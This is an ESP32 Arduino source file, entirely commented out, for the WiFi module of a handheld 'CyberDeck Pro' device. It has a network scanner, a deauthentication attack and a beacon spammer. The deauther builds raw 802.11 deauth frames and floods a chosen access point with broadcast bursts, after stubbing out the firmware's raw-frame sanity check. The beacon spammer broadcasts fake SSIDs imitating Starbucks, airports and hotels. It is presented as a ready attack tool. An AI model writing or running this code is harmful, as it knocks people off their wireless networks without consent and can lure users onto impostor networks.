// // //////////////////////////////////////////////////////////////
// // CyberDeck Pro
// // wifi.ino - WiFi Scanner + Deauther + Simple Beacon Spam
// // Features: Scan networks, Deauth attack, Beacon Spam (10 fake networks)
// //////////////////////////////////////////////////////////////

// #include <esp_wifi.h>
// #include <esp_wifi_types.h>

// //==========================================================
// // WiFi State Machine
// //==========================================================

// enum WiFiState {
//     WIFI_MENU,
//     WIFI_SCANNING,
//     WIFI_LIST,
//     WIFI_DETAILS,
//     WIFI_DEAUTHER_SCAN,
//     WIFI_DEAUTHER_LIST,
//     WIFI_DEAUTHER_ATTACK,
//     WIFI_BEACON_ATTACK
// };

// WiFiState wifiState = WIFI_MENU;

// //==========================================================
// // WiFi Menu Items
// //==========================================================

// const char *wifiMenu[] = {
//     "Scan Networks",
//     "Deauther",
//     "Beacon Spam",
//     "Back"
// };
// const int wifiMenuLength = 4;
// int wifiSelectedItem = 0;

// //==========================================================
// // WiFi Scanning
// //==========================================================

// #define MAX_WIFI_NETWORKS 30
// #define MAX_SSID_LEN 32
// #define CHANNEL_MAX 14
// #define DEAUTH_BURST_COUNT 5
// #define DEAUTH_REASON_COUNT 5

// int wifiNetworkCount = 0;
// int wifiSelectedNetwork = 0;
// bool wifiScanComplete = false;
// bool wifiScanInProgress = false;
// unsigned long wifiScanStartTime = 0;
// const unsigned long WIFI_SCAN_TIMEOUT = 15000;

// String wifiSSID[MAX_WIFI_NETWORKS];
// int32_t wifiRSSI[MAX_WIFI_NETWORKS];
// String wifiBSSID[MAX_WIFI_NETWORKS];
// int wifiChannel[MAX_WIFI_NETWORKS];

// //==========================================================
// // Deauther Variables
// //==========================================================

// struct DeauthAP {
//     String ssid;
//     String bssid;
//     uint8_t bssidBytes[6];
//     int rssi;
//     int channel;
// };

// DeauthAP deauthAPs[MAX_WIFI_NETWORKS];
// int deauthAPCount = 0;
// int deauthSelectedIndex = 0;
// int deauthPage = 0;

// bool deauthRunning = false;
// bool deauthScanning = false;
// int deauthKickCount = 0;
// int deauthTargetIndex = -1;
// uint8_t deauthTargetBSSID[6];
// int deauthTargetChannel = 1;
// unsigned long deauthLastPacket = 0;
// unsigned long deauthLastDisplay = 0;
// int deauthPacketsSent = 0;
// unsigned long deauthStartTime = 0;

// //==========================================================
// // Beacon Spam Variables - SIMPLE
// //==========================================================

// bool beaconRunning = false;
// unsigned long beaconLastPacket = 0;
// unsigned long beaconLastDisplay = 0;
// int beaconPacketsSent = 0;
// int beaconSSIDIndex = 0;

// // 10 Fake SSIDs - Enough to show up on phone scan
// const char* beaconSSIDs[] = {
//     "Free Public WiFi",
//     "Guest Network",
//     "Starbucks WiFi",
//     "McDonalds Free",
//     "Airport WiFi",
//     "Hotel Guest",
//     "Cafe Internet",
//     "Library WiFi",
//     "Mall Wireless",
//     "Fast WiFi"
// };
// const int BEACON_SSID_COUNT = 10;

// //==========================================================
// // Deauth Frame Structure
// //==========================================================

// struct __attribute__((packed)) DeauthFrame {
//     uint16_t frameControl;
//     uint16_t duration;
//     uint8_t dest[6];
//     uint8_t source[6];
//     uint8_t bssid[6];
//     uint16_t seqCtrl;
//     uint16_t reasonCode;
// };

// struct __attribute__((packed)) BeaconFrame {
//     uint16_t frameControl;
//     uint16_t duration;
//     uint8_t dest[6];
//     uint8_t source[6];
//     uint8_t bssid[6];
//     uint16_t seqCtrl;
//     uint64_t timestamp;
//     uint16_t beaconInterval;
//     uint16_t capabilities;
//     uint8_t tagID;
//     uint8_t tagLen;
//     uint8_t ssid[32];
// };

// DeauthFrame deauthFrame;
// BeaconFrame beaconFrame;

// //==========================================================
// // ESP-IDF Raw TX
// //==========================================================

// extern "C" {
//     int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t);
// }

// int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

// extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buf, int len, bool en_sys_seq);

// //==========================================================
// // Drawing Functions
// //==========================================================

// void drawWiFiHeader(const char *title) {
//     tft.fillRect(0, 0, 480, 40, TFT_DARKGREY);
//     tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
//     tft.drawCentreString(title, 240, 10, 4);
// }

// void drawWiFiFooter() {
//     tft.drawFastHLine(0, 292, 480, TFT_DARKGREY);
//     tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//     tft.drawCentreString("UP/DOWN SELECT BACK", 240, 300, 2);
// }

// //==========================================================
// // DEAUTHER FUNCTIONS
// //==========================================================

// void deauthSetChannel(int channel) {
//     if(channel < 1 || channel > CHANNEL_MAX) return;
//     esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
// }

// void deauthSendPacket(uint8_t *bssid, uint8_t *target, int channel, uint16_t reason) {
//     deauthSetChannel(channel);
    
//     deauthFrame.frameControl = 0x00C0;
//     deauthFrame.duration = 0x0000;
//     memcpy(deauthFrame.dest, target, 6);
//     memcpy(deauthFrame.source, bssid, 6);
//     memcpy(deauthFrame.bssid, bssid, 6);
//     deauthFrame.seqCtrl = random(0, 4096);
//     deauthFrame.reasonCode = reason;
    
//     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
    
//     if(err == ESP_OK) {
//         deauthKickCount++;
//         deauthPacketsSent++;
//     }
// }

// void deauthAttack() {
//     if(!deauthRunning) return;
    
//     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
//     uint16_t reasons[] = {0x07, 0x01, 0x04, 0x08, 0x0A};
    
//     for(int r = 0; r < DEAUTH_REASON_COUNT; r++) {
//         for(int i = 0; i < DEAUTH_BURST_COUNT; i++) {
//             deauthSendPacket(deauthTargetBSSID, broadcast, deauthTargetChannel, reasons[r]);
//             delayMicroseconds(100);
//         }
//     }
    
//     for(int i = 0; i < 5; i++) {
//         deauthSendPacket(deauthTargetBSSID, broadcast, deauthTargetChannel, 0x07);
//         delayMicroseconds(50);
//     }
// }

// void deauthScanNetworks() {
//     deauthScanning = true;
//     deauthAPCount = 0;
    
//     WiFi.mode(WIFI_STA);
//     WiFi.disconnect();
//     delay(100);
    
//     int n = WiFi.scanNetworks();
//     if(n > MAX_WIFI_NETWORKS) n = MAX_WIFI_NETWORKS;
    
//     for(int i = 0; i < n; i++) {
//         deauthAPs[i].ssid = WiFi.SSID(i);
//         if(deauthAPs[i].ssid.length() == 0) deauthAPs[i].ssid = "Hidden";
//         deauthAPs[i].bssid = WiFi.BSSIDstr(i);
//         deauthAPs[i].rssi = WiFi.RSSI(i);
//         deauthAPs[i].channel = WiFi.channel(i);
//         const uint8_t* bssid = WiFi.BSSID(i);
//         if(bssid) {
//             memcpy(deauthAPs[i].bssidBytes, bssid, 6);
//         }
//     }
    
//     deauthAPCount = n;
//     deauthScanning = false;
// }

// void deauthStart(int index) {
//     if(deauthRunning) return;
//     if(index < 0 || index >= deauthAPCount) return;
    
//     deauthTargetIndex = index;
//     deauthKickCount = 0;
//     deauthPacketsSent = 0;
//     deauthTargetChannel = deauthAPs[index].channel;
//     memcpy(deauthTargetBSSID, deauthAPs[index].bssidBytes, 6);
//     deauthStartTime = millis();
    
//     WiFi.mode(WIFI_STA);
//     WiFi.disconnect();
//     delay(100);
    
//     esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
    
//     deauthFrame.frameControl = 0x00C0;
//     deauthFrame.duration = 0x0000;
//     deauthFrame.reasonCode = 0x0007;
//     deauthFrame.seqCtrl = 0;
    
//     esp_wifi_set_promiscuous(true);
    
//     deauthRunning = true;
//     deauthLastPacket = 0;
//     deauthLastDisplay = 0;
// }

// void deauthStop() {
//     if(!deauthRunning) return;
    
//     deauthRunning = false;
//     deauthTargetIndex = -1;
//     esp_wifi_set_promiscuous(false);
//     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
// }

// //==========================================================
// // BEACON SPAM FUNCTIONS - SIMPLE
// //==========================================================

// void beaconSetChannel(int channel) {
//     if(channel < 1 || channel > CHANNEL_MAX) return;
//     esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
// }

// void beaconSendPacket(int channel, const char* ssid, uint8_t* bssid) {
//     beaconSetChannel(channel);
    
//     // Build beacon frame
//     beaconFrame.frameControl = 0x0080;  // Beacon frame
//     beaconFrame.duration = 0x0000;
//     memset(beaconFrame.dest, 0xFF, 6);   // Broadcast
//     memcpy(beaconFrame.source, bssid, 6);
//     memcpy(beaconFrame.bssid, bssid, 6);
//     beaconFrame.seqCtrl = random(0, 4096);
//     beaconFrame.timestamp = 0x0000000000000000ULL;
//     beaconFrame.beaconInterval = 0x0064;  // 100 TU
//     beaconFrame.capabilities = 0x0021;    // ESS + Privacy
    
//     // SSID Tag
//     beaconFrame.tagID = 0x00;  // SSID tag
//     int ssidLen = strlen(ssid);
//     if(ssidLen > 32) ssidLen = 32;
//     beaconFrame.tagLen = ssidLen;
//     memcpy(beaconFrame.ssid, ssid, ssidLen);
    
//     // Send the beacon
//     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &beaconFrame, 
//                                       sizeof(beaconFrame), false);
    
//     if(err == ESP_OK) {
//         beaconPacketsSent++;
//     }
// }

// void beaconStart() {
//     if(beaconRunning) return;
    
//     beaconRunning = true;
//     beaconPacketsSent = 0;
//     beaconSSIDIndex = 0;
//     beaconLastPacket = 0;
//     beaconLastDisplay = 0;
    
//     WiFi.mode(WIFI_STA);
//     WiFi.disconnect();
//     delay(100);
    
//     esp_wifi_set_promiscuous(true);
// }

// void beaconStop() {
//     if(!beaconRunning) return;
    
//     beaconRunning = false;
//     esp_wifi_set_promiscuous(false);
//     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
// }

// void beaconAttack() {
//     if(!beaconRunning) return;
    
//     // Generate random BSSID
//     uint8_t bssid[6];
//     bssid[0] = 0xAA;
//     bssid[1] = 0xBB;
//     bssid[2] = 0xCC;
//     bssid[3] = random(0x00, 0xFF);
//     bssid[4] = random(0x00, 0xFF);
//     bssid[5] = random(0x00, 0xFF);
    
//     // Cycle through channels 1-14
//     int channel = (beaconSSIDIndex % CHANNEL_MAX) + 1;
    
//     // Pick SSID (10 total)
//     int ssidIdx = beaconSSIDIndex % BEACON_SSID_COUNT;
//     const char* ssid = beaconSSIDs[ssidIdx];
    
//     // Send beacon
//     beaconSendPacket(channel, ssid, bssid);
    
//     beaconSSIDIndex++;
    
//     // Small delay between beacons
//     delay(20);
// }

// //==========================================================
// // WiFi Functions
// //==========================================================

// void performWiFiScan() {
//     wifiScanInProgress = true;
//     wifiScanComplete = false;
    
//     WiFi.mode(WIFI_STA);
//     WiFi.disconnect();
//     delay(100);
    
//     wifiNetworkCount = WiFi.scanNetworks();
//     if(wifiNetworkCount > MAX_WIFI_NETWORKS) wifiNetworkCount = MAX_WIFI_NETWORKS;
    
//     for(int i = 0; i < wifiNetworkCount; i++) {
//         wifiSSID[i] = WiFi.SSID(i);
//         if(wifiSSID[i].length() == 0) wifiSSID[i] = "Hidden";
//         wifiRSSI[i] = WiFi.RSSI(i);
//         wifiBSSID[i] = WiFi.BSSIDstr(i);
//         wifiChannel[i] = WiFi.channel(i);
//     }
    
//     wifiScanComplete = true;
//     wifiScanInProgress = false;
// }

// //==========================================================
// // Drawing Functions
// //==========================================================

// void drawWiFiMenu() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("WiFi Tools");
    
//     int y = 80;
//     for(int i = 0; i < wifiMenuLength; i++) {
//         if(i == wifiSelectedItem) {
//             tft.fillRoundRect(60, y - 4, 360, 40, 8, TFT_BLUE);
//             tft.setTextColor(TFT_WHITE, TFT_BLUE);
//             tft.drawCentreString(wifiMenu[i], 240, y, 4);
//         } else {
//             tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
//             tft.drawCentreString(wifiMenu[i], 240, y, 4);
//         }
//         y += 55;
//     }
//     drawWiFiFooter();
// }

// void drawScanningScreen() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("Scanning");
//     tft.setTextColor(TFT_WHITE, TFT_BLACK);
//     tft.drawCentreString("Searching for networks...", 240, 140, 4);
    
//     static int dotCount = 0;
//     dotCount = (dotCount + 1) % 4;
//     String dots = "";
//     for(int i = 0; i < dotCount; i++) dots += ".";
//     tft.drawCentreString(dots, 240, 180, 4);
//     drawWiFiFooter();
// }

// void drawNetworkList() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("Networks");
    
//     int y = 55;
//     int visible = 5;
    
//     for(int i = 0; i < visible; i++) {
//         int index = i + wifiSelectedNetwork;
//         if(index >= wifiNetworkCount) break;
        
//         if(index == wifiSelectedNetwork) {
//             tft.fillRoundRect(18, y - 4, 440, 38, 8, TFT_BLUE);
//             tft.setTextColor(TFT_WHITE, TFT_BLUE);
//             tft.drawString(">", 30, y, 4);
//             tft.drawString(wifiSSID[index], 55, y, 4);
//             tft.setTextColor(TFT_CYAN, TFT_BLUE);
//             tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
//         } else {
//             tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
//             tft.drawString(wifiSSID[index], 55, y, 4);
//             tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//             tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
//         }
//         y += 48;
//     }
    
//     tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//     tft.drawCentreString("Total: " + String(wifiNetworkCount), 240, 280, 2);
//     drawWiFiFooter();
// }

// void drawDeautherScanScreen() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("Deauther Scan");
    
//     tft.setTextColor(TFT_CYAN, TFT_BLACK);
//     tft.setTextSize(2);
//     if(deauthScanning) {
//         tft.drawCentreString("Scanning for APs...", 240, 120, 2);
//         static int dotCount = 0;
//         dotCount = (dotCount + 1) % 4;
//         String dots = "";
//         for(int i = 0; i < dotCount; i++) dots += ".";
//         tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
//         tft.drawCentreString(dots, 240, 160, 4);
//     } else if(deauthAPCount == 0) {
//         tft.drawCentreString("No APs Found", 240, 120, 2);
//         tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//         tft.setTextSize(1);
//         tft.drawCentreString("SELECT to rescan", 240, 160, 2);
//     } else {
//         tft.setTextColor(TFT_GREEN, TFT_BLACK);
//         tft.drawCentreString("Found " + String(deauthAPCount) + " APs", 240, 120, 2);
//         tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//         tft.setTextSize(1);
//         tft.drawCentreString("SELECT to view list", 240, 160, 2);
//     }
//     drawWiFiFooter();
// }

// void drawDeautherList() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("Select Target");
    
//     int itemsPerPage = 5;
//     int startIdx = deauthPage * itemsPerPage;
//     int endIdx = min(startIdx + itemsPerPage, deauthAPCount);
    
//     int y = 55;
//     for(int i = startIdx; i < endIdx; i++) {
//         int idx = i - startIdx;
//         int yPos = y + (idx * 42);
//         bool selected = (i == deauthSelectedIndex);
        
//         if(selected) {
//             tft.fillRoundRect(18, yPos - 4, 440, 38, 8, TFT_RED);
//             tft.setTextColor(TFT_WHITE, TFT_RED);
//             tft.drawString("⚡", 35, yPos, 4);
//             tft.drawString(deauthAPs[i].ssid, 65, yPos, 4);
//             tft.setTextColor(TFT_CYAN, TFT_RED);
//             tft.drawRightString("CH" + String(deauthAPs[i].channel), 460, yPos, 2);
//         } else {
//             tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
//             tft.drawString(deauthAPs[i].ssid, 65, yPos, 4);
//             tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//             tft.drawRightString("CH" + String(deauthAPs[i].channel), 460, yPos, 2);
//         }
//     }
    
//     int totalPages = (deauthAPCount + itemsPerPage - 1) / itemsPerPage;
//     tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//     tft.drawCentreString("Page " + String(deauthPage + 1) + "/" + String(max(1, totalPages)), 240, 275, 2);
//     drawWiFiFooter();
// }

// void drawDeautherAttack() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("⚡ DEAUTH ATTACK ⚡");
    
//     int y = 50;
//     int lineH = 30;
    
//     tft.setTextColor(TFT_RED, TFT_BLACK);
//     tft.setTextSize(2);
//     tft.drawCentreString(">> ATTACK ACTIVE <<", 240, y, 2);
//     y += lineH + 10;
    
//     if(deauthTargetIndex >= 0 && deauthTargetIndex < deauthAPCount) {
//         tft.setTextColor(TFT_CYAN, TFT_BLACK);
//         tft.setTextSize(1);
//         tft.drawString("Target:", 30, y, 2);
//         tft.setTextColor(TFT_WHITE, TFT_BLACK);
//         tft.drawString(deauthAPs[deauthTargetIndex].ssid, 180, y, 2);
//         y += lineH;
        
//         tft.setTextColor(TFT_CYAN, TFT_BLACK);
//         tft.drawString("BSSID:", 30, y, 2);
//         tft.setTextColor(TFT_WHITE, TFT_BLACK);
//         tft.drawString(deauthAPs[deauthTargetIndex].bssid, 180, y, 2);
//         y += lineH;
        
//         tft.setTextColor(TFT_CYAN, TFT_BLACK);
//         tft.drawString("Channel:", 30, y, 2);
//         tft.setTextColor(TFT_YELLOW, TFT_BLACK);
//         tft.drawString(String(deauthTargetChannel), 180, y, 2);
//         y += lineH;
//     }
    
//     tft.setTextColor(TFT_CYAN, TFT_BLACK);
//     tft.drawString("Packets Sent:", 30, y, 2);
//     tft.setTextColor(TFT_GREEN, TFT_BLACK);
//     tft.drawString(String(deauthPacketsSent), 180, y, 2);
//     y += lineH;
    
//     tft.setTextColor(TFT_CYAN, TFT_BLACK);
//     tft.drawString("Clients Kicked:", 30, y, 2);
//     tft.setTextColor(TFT_GREEN, TFT_BLACK);
//     tft.drawString(String(deauthKickCount), 180, y, 2);
//     y += lineH;
    
//     unsigned long duration = (millis() - deauthStartTime) / 1000;
//     tft.setTextColor(TFT_CYAN, TFT_BLACK);
//     tft.drawString("Duration:", 30, y, 2);
//     tft.setTextColor(TFT_WHITE, TFT_BLACK);
//     tft.drawString(String(duration) + "s", 180, y, 2);
    
//     int barX = 30;
//     int barY = 250;
//     int barWidth = 420;
//     int barHeight = 20;
    
//     tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);
//     int pos = (millis() / 30) % barWidth;
//     tft.fillRect(barX + pos - 15, barY, 30, barHeight, TFT_RED);
    
//     tft.setTextColor(TFT_RED, TFT_BLACK);
//     tft.setTextSize(1);
//     tft.drawCentreString("🔥 DEPLOYING DEAUTH FRAMES 🔥", 240, 278, 2);
    
//     drawWiFiFooter();
// }

// void drawBeaconAttack() {
//     tft.fillScreen(TFT_BLACK);
//     drawWiFiHeader("📡 BEACON SPAM");
    
//     int y = 60;
//     int lineH = 35;
    
//     if(beaconRunning) {
//         tft.setTextColor(TFT_GREEN, TFT_BLACK);
//         tft.setTextSize(2);
//         tft.drawCentreString(">> SPAMMING NETWORKS <<", 240, y, 2);
//         y += lineH + 10;
//     } else {
//         tft.setTextColor(TFT_YELLOW, TFT_BLACK);
//         tft.setTextSize(2);
//         tft.drawCentreString(">> READY TO SPAM <<", 240, y, 2);
//         y += lineH + 10;
//     }
    
//     tft.setTextColor(TFT_CYAN, TFT_BLACK);
//     tft.setTextSize(1);
//     tft.drawString("Packets Sent:", 30, y, 2);
//     tft.setTextColor(TFT_WHITE, TFT_BLACK);
//     tft.drawString(String(beaconPacketsSent), 250, y, 2);
//     y += lineH;
    
//     tft.drawString("SSIDs:", 30, y, 2);
//     tft.setTextColor(TFT_YELLOW, TFT_BLACK);
//     tft.drawString(String(BEACON_SSID_COUNT), 250, y, 2);
//     y += lineH;
    
//     tft.drawString("Status:", 30, y, 2);
//     tft.setTextColor(beaconRunning ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
//     tft.drawString(beaconRunning ? "ACTIVE" : "STOPPED", 250, y, 2);
    
//     // Show current SSID being spammed
//     if(beaconRunning) {
//         tft.setTextColor(TFT_CYAN, TFT_BLACK);
//         tft.drawString("Current SSID:", 30, 200, 2);
//         tft.setTextColor(TFT_ORANGE, TFT_BLACK);
//         int idx = beaconSSIDIndex % BEACON_SSID_COUNT;
//         tft.drawString(beaconSSIDs[idx], 250, 200, 2);
//     }
    
//     // Activity bar
//     if(beaconRunning) {
//         int barX = 30;
//         int barY = 250;
//         int barWidth = 420;
//         int barHeight = 20;
        
//         tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);
//         int pos = (millis() / 50) % barWidth;
//         tft.fillRect(barX + pos - 10, barY, 20, barHeight, TFT_GREEN);
        
//         tft.setTextColor(TFT_GREEN, TFT_BLACK);
//         tft.setTextSize(1);
//         tft.drawCentreString("📡 SPAMMING FAKE NETWORKS 📡", 240, 280, 2);
//     } else {
//         tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
//         tft.setTextSize(1);
//         tft.drawCentreString("SELECT to start spamming", 240, 280, 2);
//     }
    
//     drawWiFiFooter();
// }

// //==========================================================
// // Init WiFi Menu
// //==========================================================

// void initWiFiMenu() {
//     wifiState = WIFI_MENU;
//     wifiSelectedItem = 0;
//     wifiNetworkCount = 0;
//     wifiSelectedNetwork = 0;
//     deauthAPCount = 0;
//     deauthRunning = false;
//     beaconRunning = false;
//     drawWiFiMenu();
// }

// //==========================================================
// // Handle WiFi Menu
// //==========================================================

// void handleWiFiMenu() {
//     unsigned long now = millis();
//     updateButton(btnUp);
//     updateButton(btnDown);
//     updateButton(btnSelect);
//     updateButton(btnBack);
    
//     // Handle deauth attack
//     if(deauthRunning && wifiState == WIFI_DEAUTHER_ATTACK) {
//         if(now - deauthLastPacket > 30) {
//             deauthAttack();
//             deauthLastPacket = now;
//         }
//         if(now - deauthLastDisplay > 500) {
//             drawDeautherAttack();
//             deauthLastDisplay = now;
//         }
//     }
    
//     // Handle beacon attack
//     if(beaconRunning && wifiState == WIFI_BEACON_ATTACK) {
//         if(now - beaconLastPacket > 20) {
//             beaconAttack();
//             beaconLastPacket = now;
//         }
//         if(now - beaconLastDisplay > 500) {
//             drawBeaconAttack();
//             beaconLastDisplay = now;
//         }
//     }
    
//     // Handle BACK button
//     if(isPressed(btnBack)) {
//         switch(wifiState) {
//             case WIFI_DEAUTHER_ATTACK:
//                 deauthStop();
//                 wifiState = WIFI_DEAUTHER_LIST;
//                 drawDeautherList();
//                 return;
                
//             case WIFI_BEACON_ATTACK:
//                 beaconStop();
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 return;
                
//             case WIFI_DEAUTHER_LIST:
//                 deauthStop();
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 return;
                
//             case WIFI_DEAUTHER_SCAN:
//                 deauthStop();
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 return;
                
//             case WIFI_SCANNING:
//                 wifiScanComplete = true;
//                 wifiScanInProgress = false;
//                 wifiNetworkCount = 0;
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 return;
                
//             case WIFI_LIST:
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 return;
                
//             case WIFI_DETAILS:
//                 wifiState = WIFI_LIST;
//                 drawNetworkList();
//                 return;
                
//             case WIFI_MENU:
//                 currentScreen = SCREEN_MAIN;
//                 drawMainMenu();
//                 return;
//         }
//     }
    
//     switch(wifiState) {
//         case WIFI_MENU: {
//             if(isPressed(btnUp)) {
//                 wifiSelectedItem = (wifiSelectedItem - 1 + wifiMenuLength) % wifiMenuLength;
//                 drawWiFiMenu();
//             } else if(isPressed(btnDown)) {
//                 wifiSelectedItem = (wifiSelectedItem + 1) % wifiMenuLength;
//                 drawWiFiMenu();
//             } else if(isPressed(btnSelect)) {
//                 switch(wifiSelectedItem) {
//                     case 0: // Scan
//                         wifiState = WIFI_SCANNING;
//                         wifiScanComplete = false;
//                         wifiScanStartTime = now;
//                         drawScanningScreen();
//                         performWiFiScan();
//                         if(wifiNetworkCount > 0) {
//                             wifiState = WIFI_LIST;
//                             wifiSelectedNetwork = 0;
//                             drawNetworkList();
//                         } else {
//                             wifiState = WIFI_MENU;
//                             drawWiFiMenu();
//                         }
//                         break;
                        
//                     case 1: // Deauther
//                         wifiState = WIFI_DEAUTHER_SCAN;
//                         deauthAPCount = 0;
//                         deauthSelectedIndex = 0;
//                         deauthPage = 0;
//                         drawDeautherScanScreen();
//                         deauthScanNetworks();
//                         if(deauthAPCount > 0) {
//                             wifiState = WIFI_DEAUTHER_LIST;
//                             drawDeautherList();
//                         } else {
//                             wifiState = WIFI_MENU;
//                             drawWiFiMenu();
//                         }
//                         break;
                        
//                     case 2: // Beacon Spam
//                         wifiState = WIFI_BEACON_ATTACK;
//                         beaconStart();
//                         drawBeaconAttack();
//                         break;
                        
//                     case 3: // Back
//                         currentScreen = SCREEN_MAIN;
//                         drawMainMenu();
//                         break;
//                 }
//             }
//             break;
//         }
        
//         case WIFI_SCANNING: {
//             if(wifiScanComplete) {
//                 wifiState = WIFI_LIST;
//                 wifiSelectedNetwork = 0;
//                 drawNetworkList();
//             }
//             if(now - wifiScanStartTime > WIFI_SCAN_TIMEOUT && !wifiScanComplete) {
//                 wifiScanComplete = true;
//                 wifiScanInProgress = false;
//                 wifiNetworkCount = 0;
//                 wifiState = WIFI_LIST;
//                 drawNetworkList();
//             }
//             break;
//         }
        
//         case WIFI_LIST: {
//             if(wifiNetworkCount == 0) {
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 break;
//             }
//             if(isPressed(btnUp)) {
//                 wifiSelectedNetwork = (wifiSelectedNetwork - 1 + wifiNetworkCount) % wifiNetworkCount;
//                 drawNetworkList();
//             } else if(isPressed(btnDown)) {
//                 wifiSelectedNetwork = (wifiSelectedNetwork + 1) % wifiNetworkCount;
//                 drawNetworkList();
//             } else if(isPressed(btnSelect)) {
//                 wifiState = WIFI_DETAILS;
//                 drawWiFiHeader("Network Details");
//                 drawWiFiFooter();
//             }
//             break;
//         }
        
//         case WIFI_DETAILS:
//             break;
            
//         case WIFI_DEAUTHER_SCAN:
//             break;
            
//         case WIFI_DEAUTHER_LIST: {
//             if(deauthAPCount == 0) {
//                 wifiState = WIFI_MENU;
//                 drawWiFiMenu();
//                 break;
//             }
            
//             int itemsPerPage = 5;
//             if(isPressed(btnUp)) {
//                 deauthSelectedIndex--;
//                 if(deauthSelectedIndex < 0) deauthSelectedIndex = deauthAPCount - 1;
//                 deauthPage = deauthSelectedIndex / itemsPerPage;
//                 drawDeautherList();
//             } else if(isPressed(btnDown)) {
//                 deauthSelectedIndex++;
//                 if(deauthSelectedIndex >= deauthAPCount) deauthSelectedIndex = 0;
//                 deauthPage = deauthSelectedIndex / itemsPerPage;
//                 drawDeautherList();
//             } else if(isPressed(btnSelect)) {
//                 deauthStart(deauthSelectedIndex);
//                 wifiState = WIFI_DEAUTHER_ATTACK;
//                 deauthLastPacket = 0;
//                 deauthLastDisplay = 0;
//                 drawDeautherAttack();
//             }
//             break;
//         }
        
//         case WIFI_DEAUTHER_ATTACK:
//             break;
            
//         case WIFI_BEACON_ATTACK:
//             if(isPressed(btnSelect)) {
//                 if(beaconRunning) {
//                     beaconStop();
//                 } else {
//                     beaconStart();
//                 }
//                 drawBeaconAttack();
//             }
//             break;
//     }
// }